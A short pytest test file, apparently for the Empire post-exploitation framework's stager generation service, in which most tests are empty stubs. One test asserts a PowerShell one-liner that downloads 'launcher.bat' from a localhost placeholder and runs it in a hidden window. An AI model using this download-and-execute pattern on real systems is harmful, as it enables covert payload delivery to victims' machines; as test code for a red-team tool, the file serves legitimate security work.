import pytest

from empire.server.common.empire import MainMenu


@pytest.fixture(scope="module")
def stager_generation_service(main: MainMenu):
    return main.stagergenv2


def test_generate_launcher_fetcher(stager_generation_service):
    launcher = stager_generation_service.generate_launcher_fetcher(encode=False)

    assert (
        launcher
        == 'wget "http://127.0.0.1/launcher.bat" -outfile "launcher.bat"; Start-Process -FilePath .\\launcher.bat -Wait -passthru -WindowStyle Hidden;'
    )


def test_generate_launcher(stager_generation_service):
    pass


def test_generate_dll(stager_generation_service):
    pass


def test_generate_powershell_exe(stager_generation_service):
    pass


def test_generate_powershell_shellcode(stager_generation_service):
    pass


def test_generate_exe_oneliner(stager_generation_service):
    pass


def test_generate_python_exe(stager_generation_service):
    pass


def test_generate_python_shellcode(stager_generation_service):
    pass


def test_generate_dylib(stager_generation_service):
    pass


def test_generate_appbundle(stager_generation_service):
    pass


def test_generate_pkg(stager_generation_service):
    pass


def test_generate_jar(stager_generation_service):
    pass


def test_generate_upload(stager_generation_service):
    pass


def test_generate_stageless(stager_generation_service):
    pass
